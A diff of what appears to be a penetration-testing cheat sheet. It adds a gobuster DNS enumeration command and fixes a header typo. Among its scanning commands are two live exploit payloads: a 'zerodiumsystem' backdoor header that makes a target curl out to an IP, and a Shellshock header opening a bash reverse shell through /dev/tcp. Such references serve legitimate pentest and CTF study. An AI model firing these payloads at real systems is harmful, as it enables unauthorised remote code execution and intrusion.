@@ -87,9 +87,10 @@ tftp> put <file>
 $ gobuster dir -w <wordlist> -u <URL>
 $ gobuster dir -w <wordlist> -u <URL> -x php,html
 $ gobuster vhost -w <wordlist> -u <URL>
+$ gobuster dns -w <wordlist> -d <Domain Name>
 $ ffuf -u <URL>/FUZZ -w <wordlist>
 $ curl -I <URL>
-$ curl <URL> -H 'User-Agentt: zerodiumsystem("curl <IP address>");'
+$ curl <URL> -H 'User-agent: zerodiumsystem("curl <IP address>");'
 $ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/<IP address>/443 0>&1" http://<IP address>/cgi-bin/user.sh
 $ feroxbuster -w <wordlist> -u <URL>
 $ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
